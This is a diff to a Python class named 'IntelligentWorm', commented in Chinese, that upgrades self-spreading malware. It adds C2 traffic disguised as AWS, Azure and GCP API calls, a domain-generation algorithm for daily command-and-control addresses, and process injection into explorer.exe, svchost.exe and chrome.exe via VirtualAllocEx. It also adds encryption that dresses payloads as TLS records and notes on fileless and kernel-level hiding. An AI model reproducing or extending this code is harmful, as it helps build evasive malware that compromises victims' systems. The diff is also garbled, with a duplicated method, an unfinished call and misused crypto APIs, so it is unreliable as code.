@@ -250,24 +250,26 @@ class IntelligentWorm:
         return False
 
     def _select_communication_channel(self):
-        """选择最佳通信渠道"""
-        # 评估各渠道的可用性和隐蔽性
-        channels = [
-            ('https', 0.9, 0.7),  # 类型, 可用性, 隐蔽性
-            ('dns', 0.6, 0.9),
-            ('icmp', 0.5, 0.8)
+        """改进的通信渠道选择，模仿合法云服务"""
+        cloud_apis = [
+            ('aws', "https://dynamodb.{region}.amazonaws.com", 0.8),
+            ('azure', "https://{region}.blob.core.windows.net", 0.7),
+            ('gcp', "https://storage.googleapis.com", 0.6)
         ]
 
-        # 根据当前威胁等级加权选择
-        weights = []
-        for _, availability, stealth in channels:
-            weight = (availability * (1 - self.threat_level / 10) + (stealth * self.threat_level / 10))
-            weights.append(weight)
+        # 动态生成请求参数模仿正常API调用
+        region = random.choice(['us-east-1', 'eu-west-1', 'ap-southeast-1'])
+        service, base_url, weight = random.choices(cloud_apis, weights=[x[2] for x in cloud_apis])[0]
+        url = base_url.format(region=region) + f"/v1/{random.randint(1000, 9999)}"
 
-        total = sum(weights)
-        probs = [w / total for w in weights]
-        index = np.random.choice(len(channels), p=probs)
-        return channels[index][0]
+        return {
+            'url': url,
+            'headers': {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+                'X-Requested-With': 'XMLHttpRequest',
+                'Accept': 'application/json'
+            }
+        }
 
     # === 反检测增强 ===
 
@@ -295,41 +297,44 @@ class IntelligentWorm:
         # 分析当前行为模式是否偏离正常
         return False
 
-    def _evade_detection(self):
-        """执行规避动作"""
-        actions = [
-            self._change_behavior_pattern,
-            self._switch_camouflage,
-            self._reduce_activity,
-            self._sleep_random_time
+    def _load_learning_model(self):
+        """改进的模型加载方式，防止指纹识别"""
+        model_fragments = [
+            'model_fragment_1.pkl',
+            'model_fragment_2.pkl',
+            'model_fragment_3.pkl'
         ]
 
-        # 根据威胁等级选择规避动作
-        action_weights = [
-            max(0.1, 1 - self.threat_level / 5),
-            min(0.9, self.threat_level / 5),
-            0.3,
-            0.5
-        ]
+        self.learning_model = {}
+        for fragment in random.sample(model_fragments, 2):  # 只加载部分模块
+            with open(fragment, 'rb') as f:
+                self.learning_model[fragment] = pickle.load(f)
 
-        total = sum(action_weights)
-        probs = [w / total for w in action_weights]
-        action = np.random.choice(actions, p=probs)
-        action()
+        # 添加随机噪声干扰特征分析
+        for layer in self.learning_model.values():
+            if hasattr(layer, 'weights'):
+                layer.weights = [w * random.uniform(0.9, 1.1) for w in layer.weights]
 
     # === 智能学习模块 ===
 
     def _load_learning_model(self):
-        """加载学习模型"""
-        try:
-            # 从隐蔽位置或C2服务器加载预训练模型
-            model_path = self._get_model_path()
-            if model_path and os.path.exists(model_path):
-                with open(model_path, 'rb') as f:
-                    self.learning_model = pickle.load(f)
-        except Exception as e:
-            self._log_error(e)
+        """改进的模型加载方式，防止指纹识别"""
+        model_fragments = [
+            'model_fragment_1.pkl',
+            'model_fragment_2.pkl',
+            'model_fragment_3.pkl'
+        ]
 
+        self.learning_model = {}
+        for fragment in random.sample(model_fragments, 2):  # 只加载部分模块
+            with open(fragment, 'rb') as f:
+                self.learning_model[fragment] = pickle.load(f)
+
+        # 添加随机噪声干扰特征分析
+        for layer in self.learning_model.values():
+            if hasattr(layer, 'weights'):
+                layer.weights = [w * random.uniform(0.9, 1.1) for w in layer.weights]
+                _evade_detection(
     def update_model(self, new_data):
         """在线更新学习模型"""
         if not self.learning_model:
@@ -364,21 +369,18 @@ class IntelligentWorm:
         self.behavior_history.append(log_entry)
 
     def _generate_c2_list(self):
-        """生成动态C2服务器列表"""
-        base_servers = [
-            "https://api.weather.com/v3/wx/observations/current",
-            "https://cdn.microsoft.com/security/updates"
+        """使用DGA生成动态C2地址"""
+
+        def dga(seed):
+            random.seed(seed)
+            tlds = ['.com', '.net', '.org']
+            return f"{''.join(random.sample('abcdefghijklmnopqrstuvwxyz', 12))}{random.choice(tlds)}"
+
+        daily_seed = datetime.now().strftime("%Y%m%d")
+        return [
+            f"https://api.{dga(daily_seed + str(i))}/v1/query"
+            for i in range(3)
         ]
-
-        # 添加伪装成合法云服务的URL
-        cloud_services = [
-            "https://graph.microsoft.com/v1.0/me",
-            "https://www.googleapis.com/oauth2/v3/tokeninfo",
-            "https://api.dropboxapi.com/2/files/list_folder"
-        ]
-
-        return base_servers + random.sample(cloud_services, 1)
-
     def _select_camouflage(self):
         """选择当前伪装身份"""
         personas = [
@@ -390,8 +392,63 @@ class IntelligentWorm:
 
     # === 其他必要方法 ===
     def _validate_environment(self):
-        """验证环境"""
-        pass
+        """改进的环境适配检查"""
+        env_adapters = {
+            'windows': self._windows_adaptation,
+            'linux': self._linux_adaptation,
+            'docker': self._container_adaptation
+        }
+
+        current_env = self._detect_environment()
+        env_adapters.get(current_env, self._default_adaptation)()
+
+    # 改进方案：
+    # 进程注入：寄生在合法进程中
+    # 无文件攻击：完全内存操作
+    # 内核级隐藏：通过驱动隐藏痕迹
+    def _memory_injection(self):
+        """改进的内存驻留技术"""
+        target_processes = ['explorer.exe', 'svchost.exe', 'chrome.exe']
+        for proc in psutil.process_iter():
+            if proc.name().lower() in target_processes:
+                try:
+                    # 使用进程空洞技术注入
+                    handle = ctypes.windll.kernel32.OpenProcess(
+                        0x1F0FFF, False, proc.pid)
+                    ctypes.windll.kernel32.VirtualAllocEx(
+                        handle, 0, len(self.code),
+                        0x3000, 0x40)
+                    # 写入并执行代码...
+                    break
+                except:
+                    continue
+
+    # 增强加密抗破解
+    def _encrypt(self, data):
+        """改进的混合加密方案"""
+        # 每次生成临时RSA密钥对
+        temp_key = RSA.generate(2048)
+        encrypted_key = temp_key.publickey().encrypt(self.encryption_key, 32)[0]
+
+        # 使用临时AES密钥加密数据
+        cipher = AES.new(os.urandom(32), AES.MODE_GCM)
+        ciphertext, tag = cipher.encrypt_and_digest(data.encode())
+
+        # 将加密数据伪装成TLS记录
+        return {
+            'tls_version': '1.3',
+            'cipher_suite': 'TLS_AES_256_GCM_SHA384',
+            'payload': base64.b64encode(encrypted_key + cipher.nonce + tag + ciphertext)
+        }
+
+    def _detect_environment(self):
+        """精确环境检测"""
+        if 'docker' in os.environ.get('HOSTNAME', ''):
+            return 'docker'
+        elif 'linux' in sys.platform.lower():
+            return 'linux'
+        else:
+            return 'windows'
 
     def _log_error(self, error):
         """记录错误"""
